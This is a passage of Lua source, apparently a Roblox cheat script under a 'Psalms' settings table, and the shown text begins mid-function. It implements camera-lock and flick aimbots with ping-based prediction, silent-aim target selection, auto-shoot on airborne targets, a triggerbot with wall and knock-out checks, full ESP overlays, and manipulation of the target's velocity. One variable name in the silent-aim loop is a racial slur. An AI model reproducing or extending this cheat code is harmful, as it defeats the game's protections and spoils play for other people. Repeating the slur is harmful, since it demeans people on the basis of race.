						local pingBase = predictionTable[i][2]
						local advancePredictionValue = calculateAdvancePrediction(Plr, workspace.CurrentCamera.CFrame.Position, pingBase)
						getgenv().Psalms.HorizontalPrediction = advancePredictionValue
						getgenv().Psalms.VerticalPrediction = advancePredictionValue
						break
					end
				end
			elseif getgenv().Psalms.AutoPredMode == "Blatant" then
				for i = 1, #Blatant do
					if ping < Blatant[i][1] then
						local value = Blatant[i][2]
						getgenv().Psalms.HorizontalPrediction = value
						getgenv().Psalms.VerticalPrediction = value
						break
					end
				end
			end
		end
	end
end


RunService.Heartbeat:Connect(function()
	if getgenv().Psalms.Flick and Plr and Plr.Character then
		local playerHumanoid = Plr.Character:FindFirstChild("Humanoid")
		if playerHumanoid and playerHumanoid.Health > 0 then

			local targetPart = Plr.Character:FindFirstChild("UpperTorso") or Plr.Character:FindFirstChild("Head")
			if targetPart and playerHumanoid.FloorMaterial == Enum.Material.Air then
				local camera = workspace.CurrentCamera
				local targetPosition = targetPart.Position + targetPart.Velocity * getgenv().Psalms.VerticalPrediction
				camera.CFrame = CFrame.new(camera.CFrame.Position, targetPosition)
			end
		end
	end
end)



RunService.Heartbeat:Connect(function()
	if getgenv().Psalms.Camera and Plr and Plr.Character and getgenv().Psalms.SelectedPart then
		local camera = Workspace.CurrentCamera
		local selectedPart = getgenv().Psalms.SelectedPart
		local targetPart = Plr.Character[selectedPart]

		if targetPart then
			local velocity = targetPart.Velocity
				if getgenv().Psalms.ResolverEnabled then
					local resolverType = getgenv().Psalms.ResolverType
						if resolverType == "Recalculate" then
							velocity = targetPart.Velocity
					elseif resolverType == "LookVector" then
						velocity = targetPart.CFrame.LookVector * getgenv().Psalms.HorizontalPrediction
					elseif resolverType == "MoveDirection" then
							velocity = Plr.Character.Humanoid.MoveDirection * Plr.Character.Humanoid.WalkSpeed
					elseif resolverType == "ZeroPrediction" then
							velocity = Vector3.new(targetPart.Velocity.X, 0, targetPart.Velocity.Z)
					end
				else
				velocity = targetPart.Velocity
			end

			local jumpOffset = getgenv().Psalms.jumpoffset or 0
			local fallOffset = getgenv().Psalms.FallOffset or 0

			local verticalVelocity = velocity.Y
			local appliedVerticalOffset = 0

			if verticalVelocity > 0 then
				appliedVerticalOffset = jumpOffset
			elseif verticalVelocity < 0 then
				appliedVerticalOffset = -fallOffset
			end

			local horizontalPrediction = getgenv().Psalms.HorizontalPrediction
			local verticalPrediction = getgenv().Psalms.VerticalPrediction

			local targetPosition = Vector3.new(
				targetPart.Position.X + (velocity.X * horizontalPrediction),
				targetPart.Position.Y + (velocity.Y * verticalPrediction) + appliedVerticalOffset,
				targetPart.Position.Z + (velocity.Z * horizontalPrediction)
			)

			local smoothness = getgenv().Psalms.smoothness or 0.1 
			camera.CFrame = camera.CFrame:Lerp(CFrame.new(camera.CFrame.Position, targetPosition), smoothness)
		end
	end
end)

local players = game:GetService("Players")
local client = players.LocalPlayer

local function AutoShoot()
	if Plr then
		local character = client.Character
		if character then
			local tool = character:FindFirstChildOfClass("Tool")
			if tool and tool:IsA("Tool") then
				tool:Activate()
			end
		else
			warn("Character not found for client")
		end
	else
		warn("No target (Plr) found")
	end
end

local Shot2ing = false

local function ApplyAntiGround()
	local character = Plr.Character
	local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

	if humanoidRootPart then
		local velocity = humanoidRootPart.Velocity
		local SigmaAir = humanoidRootPart.Position.Y > 2

		if not SigmaAir and velocity.Y < -3 then
			if getgenv().Psalms.NoGroundShot then
				humanoidRootPart.Velocity = Vector3.new(velocity.X, 0, velocity.Z)
			end
		else
			if not getgenv().Psalms.NoGroundShot then
				humanoidRootPart.Velocity = Vector3.new(velocity.X, velocity.Y, velocity.Z)
			end
		end
	end
end

local targetSigm99928 = getgenv().Psalms.ShootDelay 
local targetSigmaPOBALLs = nil

local function checkTarget()
	if Plr and Plr.Character then
		local humanoid = Plr.Character:FindFirstChildOfClass("Humanoid")
		local humanoidRootPart = Plr.Character:FindFirstChild("HumanoidRootPart")

		if humanoid and humanoidRootPart then
			local SigmaAir = humanoid:GetState() == Enum.HumanoidStateType.Freefall or humanoidRootPart.Velocity.Y > 2


			if SigmaAir and getgenv().Psalms.AutoAir then
				if not targetSigmaPOBALLs then

					targetSigmaPOBALLs = tick()
				else

					local airDuration = tick() - targetSigmaPOBALLs
					if airDuration >= targetSigm99928 then
						if not Shot2ing then
							Shot2ing = true
							while Plr and Plr.Character and (SigmaAir) do
								AutoShoot()
								wait(0.001)

								SigmaAir = humanoid:GetState() == Enum.HumanoidStateType.Freefall or humanoidRootPart.Velocity.Y > 2


								if not SigmaAir then
									Shot2ing = false
									targetSigmaPOBALLs = nil 
									break
								end
							end
							Shot2ing = false
						end
					end
				end
			else

				targetSigmaPOBALLs = nil
				Shot2ing = false
			end
		end
	end
end





game:GetService("RunService").RenderStepped:Connect(function()
    LookAtPlayer(Plr)
    checkTarget()

    if Plr and getgenv().Psalms.AutoUnlock then
        local char = Plr.Character
        if char then
            local hum = char:FindFirstChildWhichIsA("Humanoid")
            if hum then
                if hum.Health <= 0 or hum.Health < 6 then
                    
                    enabled = false
                    Plr = nil
                    destroyTracer()      
                end
            else
                
                enabled = false
                Plr = nil
                destroyTracer()
            end
        else
            
            enabled = false
            Plr = nil
            destroyTracer()
        end
    end

    if Plr then
        updatePredictionValue()
        ApplyAntiGround()
    end
end)


local Camera = workspace.CurrentCamera



getgenv().Filled = false
getgenv().FOVTransparency = 0.8
getgenv().FOVThickness = 1
getgenv().FOVColor = Color3.new(1, 1, 1)
getgenv().ShowFOV = false
getgenv().FOVSize = 25


local FOV = Drawing.new("Circle")
FOV.Transparency = getgenv().FOVTransparency
FOV.Thickness = getgenv().FOVThickness
FOV.Color = getgenv().FOVColor
FOV.Filled = getgenv().Filled
FOV.Radius = getgenv().FOVSize
FOV.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)

local function IsPlayerInFOV(player)
	if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then
		return false
	end

	if getgenv().Psalms.FriendCheck and LocalPlayer:IsFriendsWith(player) then
		return false
	end
	if getgenv().Psalms.TeamCheck and player.Team and LocalPlayer.Team and player.Team == LocalPlayer.Team then
		return false
	end

	local characterRootPart = player.Character.HumanoidRootPart
	local screenPosition, onScreen = Camera:WorldToViewportPoint(characterRootPart.Position)
	local centerScreenPosition = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
	local distance = (centerScreenPosition - Vector2.new(screenPosition.X, screenPosition.Y)).Magnitude

	if onScreen and distance <= FOV.Radius then
		local ray = Ray.new(Camera.CFrame.Position, (characterRootPart.Position - Camera.CFrame.Position).unit * 500)
		local part, position = workspace:FindPartOnRay(ray, LocalPlayer.Character)
		return not part or part:IsDescendantOf(player.Character)
	end
	return false
end


RunService.RenderStepped:Connect(function()
	FOV.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
	FOV.Radius = getgenv().FOVSize
	FOV.Visible = getgenv().ShowFOV
	targetSigm99928 = getgenv().Psalms.ShootDelay

	if getgenv().Psalms.SilentAim then
		local NiggerLocated = false

		for _, player in ipairs(Players:GetPlayers()) do
			if player ~= LocalPlayer and IsPlayerInFOV(player) then
				NiggerLocated = true
				Plr = player
				break
			end
		end

		if not NiggerLocated then
			Plr = nil
		end
	end
end)


local espCache = {}

local function getESP(player)
	if not espCache[player] then
		espCache[player] = {
			Box = Drawing.new("Square"),
			Name = Drawing.new("Text"),
			HealthOutline = Drawing.new("Square"),
			HealthBar = Drawing.new("Square"),
			Tracer = Drawing.new("Line"),
			Distance = Drawing.new("Text"),
		}
		local d = espCache[player]
		d.Box.Thickness = 1.5
		d.Box.Filled = false
		d.Box.Color = Color3.fromRGB(0, 102, 255)

		d.Name.Size = 14
		d.Name.Center = true
		d.Name.Outline = true
		d.Name.Color = Color3.fromRGB(255, 255, 255)

		d.HealthOutline.Size = Vector2.new(4, 0)
		d.HealthOutline.Filled = false
		d.HealthOutline.Color = Color3.fromRGB(0, 0, 0)

		d.HealthBar.Filled = true
		d.HealthBar.Color = Color3.fromRGB(0, 255, 0)

		d.Tracer.Thickness = 1.5
		d.Tracer.Color = Color3.fromRGB(0, 255, 0)

		d.Distance.Size = 13
		d.Distance.Center = true
		d.Distance.Outline = true
		d.Distance.Color = Color3.fromRGB(255, 255, 255)
	end
	return espCache[player]
end

local function hideESP(player)
	if espCache[player] then
		for _, obj in pairs(espCache[player]) do
			obj.Visible = false
		end
	end
end

RunService.RenderStepped:Connect(function()
	for _, player in ipairs(Players:GetPlayers()) do
		if player ~= LocalPlayer then
			local drawings = getESP(player)
			local char = player.Character

			if char and char:FindFirstChild("HumanoidRootPart") and char:FindFirstChild("Head") and char:FindFirstChild("Humanoid") then
				local root = char.HumanoidRootPart
				local head = char.Head
				local hum = char.Humanoid

				local pos, onScreen = Camera:WorldToViewportPoint(root.Position)

				if onScreen then
					
					local headPos = head.Position + Vector3.new(0, 1, 0)
					local feetPos = root.Position - Vector3.new(0, 3.5, 0)
					
					local top = Camera:WorldToViewportPoint(headPos)
					local bottom = Camera:WorldToViewportPoint(feetPos)
					
					local boxHeight = math.abs(top.Y - bottom.Y)
					local boxWidth = boxHeight * 0.55
					
					local boxX = pos.X - boxWidth / 2
					local boxY = math.min(top.Y, bottom.Y)
					
					local boxPos = Vector2.new(boxX, boxY)

					
					drawings.Box.Size = Vector2.new(boxWidth, boxHeight)
					drawings.Box.Position = boxPos
					drawings.Box.Visible = getgenv().Psalms.BoxESP

					
					drawings.Name.Text = player.DisplayName
					drawings.Name.Position = Vector2.new(pos.X, top.Y - 18)
					drawings.Name.Visible = getgenv().Psalms.NameESP

					
					local hpPercent = hum.Health / hum.MaxHealth
					drawings.HealthOutline.Size = Vector2.new(4, boxHeight)
					drawings.HealthOutline.Position = Vector2.new(boxPos.X - 6, boxPos.Y)
					
					drawings.HealthBar.Size = Vector2.new(2, boxHeight * hpPercent)
					drawings.HealthBar.Position = Vector2.new(boxPos.X - 6, boxPos.Y + boxHeight * (1 - hpPercent))

					drawings.HealthBar.Size = Vector2.new(2, boxHeight * hpPercent)
					drawings.HealthBar.Position = Vector2.new(boxPos.X - 6, boxPos.Y + boxHeight * (1 - hpPercent))
					drawings.HealthBar.Visible = getgenv().Psalms.HealthESP

					
					drawings.Tracer.From = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y)
					drawings.Tracer.To = Vector2.new(pos.X, pos.Y)
					drawings.Tracer.Visible = getgenv().Psalms.TracerESP

					
					local dist = math.floor((Camera.CFrame.Position - root.Position).Magnitude / 3.28)
					drawings.Distance.Text = tostring(dist) .. " studs"
					drawings.Distance.Position = Vector2.new(pos.X, pos.Y + boxHeight + 2)
					drawings.Distance.Visible = getgenv().Psalms.DistanceESP
				else
					hideESP(player)
				end
			else
				hideESP(player)
			end
		end
	end
end)


Players.PlayerRemoving:Connect(function(player)
	if espCache[player] then
		for _, obj in pairs(espCache[player]) do obj:Remove() end
		espCache[player] = nil
	end
end)



local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local Camera = workspace.CurrentCamera
local LocalPlayer = Players.LocalPlayer

local fovCircle = Drawing.new("Circle")
fovCircle.Thickness = 1
fovCircle.NumSides = 50
fovCircle.Color = Color3.fromRGB(255, 0, 0)
fovCircle.Transparency = 0.5
fovCircle.Filled = false

local function PositionTolerance(position, tolerance)
    local screenPoint = Camera:WorldToViewportPoint(position)
    local screenCenter = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
    return (Vector2.new(screenPoint.X, screenPoint.Y) - screenCenter).Magnitude <= tolerance
end

local function IsWithinDistance(player)
    local char = player.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    local myRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not (root and myRoot) then return false end
    return (root.Position - myRoot.Position).Magnitude <= getgenv().Psalms.TriggerDistance
end

local function IsInFOV(player)
    local char = player.Character
    if not char then return false end
    local partName = getgenv().Psalms.SilentSelectedPart
    local part = char:FindFirstChild(partName)
    if part then
        return PositionTolerance(part.Position, getgenv().Psalms.TriggerFOVSize)
    end
    return false
end

local function WallCheck(targetPart)
    if not getgenv().Psalms.TriggerWallCheck then return true end
    local origin = Camera.CFrame.Position
    local direction = (targetPart.Position - origin)
    local raycastParams = RaycastParams.new()
    raycastParams.FilterDescendantsInstances = {LocalPlayer.Character or {}}
    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
    local result = workspace:Raycast(origin, direction, raycastParams)
    return result == nil
end

local function KOCheck(player)
    if not getgenv().Psalms.TriggerKOCheck then return true end
    local be = player.Character and player.Character:FindFirstChild("BodyEffects")
    local ko = be and be["K.O"] and be["K.O"].Value
    local grabbed = player.Character and player.Character:FindFirstChild("GRABBING_CONSTRAINT")
    return not (ko or grabbed)
end

local function TriggerBot()
    if not getgenv().Psalms.TriggerEnabled then return end

    local char = LocalPlayer.Character
    if not char then return end
    local tool = char:FindFirstChildOfClass("Tool")
    if not tool then return end

    for _, player in ipairs(Players:GetPlayers()) do
        if player == LocalPlayer then continue end
        if not (IsInFOV(player) and IsWithinDistance(player)) then continue end

        local tChar = player.Character
        local root = tChar and tChar:FindFirstChild("HumanoidRootPart")
        if not root then continue end

        if not WallCheck(root) or not KOCheck(player) then continue end

        if PositionTolerance(root.Position, getgenv().Psalms.TriggerTolerance) then
            task.wait(getgenv().Psalms.TriggerDelay)
            tool:Activate()
            task.wait(getgenv().Psalms.TriggerTapDelay)
        end
    end
end


RunService.RenderStepped:Connect(function()
    fovCircle.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
    fovCircle.Radius = getgenv().Psalms.TriggerFOVSize
    fovCircle.Visible = getgenv().Psalms.TriggerFOVShow
end)


RunService.Heartbeat:Connect(TriggerBot)


local aimTracer = Drawing.new("Line")
aimTracer.Thickness = 2.5
aimTracer.Color = Color3.fromRGB(0, 170, 255)
aimTracer.Transparency = 1
aimTracer.Visible = false

local function GetClosestPart(character)
    if not character then return nil end
    local closestPart = nil
    local shortestDist = math.huge
    local camera = workspace.CurrentCamera
    local screenCenter = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)

    for _, part in ipairs(character:GetChildren()) do
        if part:IsA("BasePart") and part.Transparency < 1 then
            local pos, onScreen = camera:WorldToViewportPoint(part.Position)
            if onScreen then
                local dist = (Vector2.new(pos.X, pos.Y) - screenCenter).Magnitude
                if dist < shortestDist then
                    shortestDist = dist
                    closestPart = part
                end
            end
        end
    end
    return closestPart
end
RunService.RenderStepped:Connect(function()
    local target = Plr
    if not target or not target.Character or not getgenv().Psalms.AimTracerEnabled then
        aimTracer.Visible = false
        return
    end

    local useClosest = getgenv().Psalms.ClosestPartEnabled
    local mode = getgenv().Psalms.ClosestPartMode

    local finalPart = nil

    if useClosest then
        finalPart = GetClosestPart(target.Character)
    else
        local partName = (mode == "Camera") and getgenv().Psalms.SelectedPart or getgenv().Psalms.SilentSelectedPart
        finalPart = target.Character:FindFirstChild(partName)
    end

    if not finalPart then
        aimTracer.Visible = false
        return
    end
    local myChar = LocalPlayer.Character
    local startPart = myChar and (myChar:FindFirstChild("HumanoidRootPart") or myChar:FindFirstChild("Head"))

    if not startPart then
        aimTracer.Visible = false
        return
    end

    local startPos3D = startPart.Position
    local endPos3D   = finalPart.Position


    local startScreen = workspace.CurrentCamera:WorldToViewportPoint(startPos3D)
    local endScreen   = workspace.CurrentCamera:WorldToViewportPoint(endPos3D)


    if startScreen.Z > 0 and endScreen.Z > 0 then
        aimTracer.From = Vector2.new(startScreen.X, startScreen.Y)
        aimTracer.To   = Vector2.new(endScreen.X, endScreen.Y)
        aimTracer.Visible = true
    else
        aimTracer.Visible = false
    end
end)

--------------------------
